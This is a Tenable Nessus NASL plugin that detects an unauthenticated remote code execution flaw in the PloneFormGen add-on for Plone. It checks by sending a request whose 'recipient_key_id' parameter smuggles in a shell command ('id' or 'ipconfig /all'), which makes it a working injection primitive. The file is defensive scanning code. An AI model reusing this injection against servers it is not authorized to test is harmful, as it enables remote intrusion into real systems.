#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(66862);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2015/09/24 23:21:19 $");

  script_bugtraq_id(60247);
  script_osvdb_id(93757);

  script_name(english:"Plone PloneFormGen Unspecified Arbitrary Code Execution");
  script_summary(english:"Tries to execute arbitrary code");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a Python script that is affected by a
remote code execution vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of PloneFormGen, an add-on for Plone, installed on the
remote web server contains a flaw that allows arbitrary code execution. 
Using a specially crafted URL, this can allow an unauthenticated, remote
attacker the ability to run arbitrary commands on the system subject to
the privileges of the web server user."
  );
  # http://plone.org/products/plone/security/advisories/ploneformgen-vulnerability-requires-immediate-upgrade
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?3e7f0ef9");
  script_set_attribute(attribute:"see_also", value:"https://pypi.python.org/pypi/Products.PloneFormGen/1.7.11");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 1.7.11 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/05/29");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/05/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/06/11");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:plone:plone");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("plone_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("www/plone");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("webapp_func.inc");

port = get_http_port(default:80);

install = get_install_from_kb(
  appname : "plone",
  port    : port,
  exit_on_fail:TRUE
);

dir = install["dir"];
install_url = build_url(qs:dir, port:port);

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig%20/all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig%20/all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig%20/all'] = "Subnet Mask";

foreach cmd (cmds)
{
  url = '@@gpg_services/encrypt?data=&recipient_key_id=%26' + cmd;

  res = http_send_recv3(
    method       : "GET",
    item         : dir + "/" + url,
    port         : port,
    exit_on_fail : TRUE
  );

  if (egrep(pattern:cmd_pats[cmd], string:res[2]))
  {
    if (report_verbosity > 0)
    {
      snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
      report =
        '\nNessus was able to verify the issue exists using the following request :' +
        '\n' +
        '\n' + install_url + '/' + url +
        '\n' +
        '\n';
      if (report_verbosity > 1)
      {
        report +=
          '\nNessus executed the command : "'+cmd+'" which produced the' +
          '\nfollowing output :' +
          '\n' +
          '\n' + snip +
          '\n' + chomp(res[2]) +
          '\n' + snip +
          '\n';
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, "Plone", install_url, "PloneFormGen add-on");
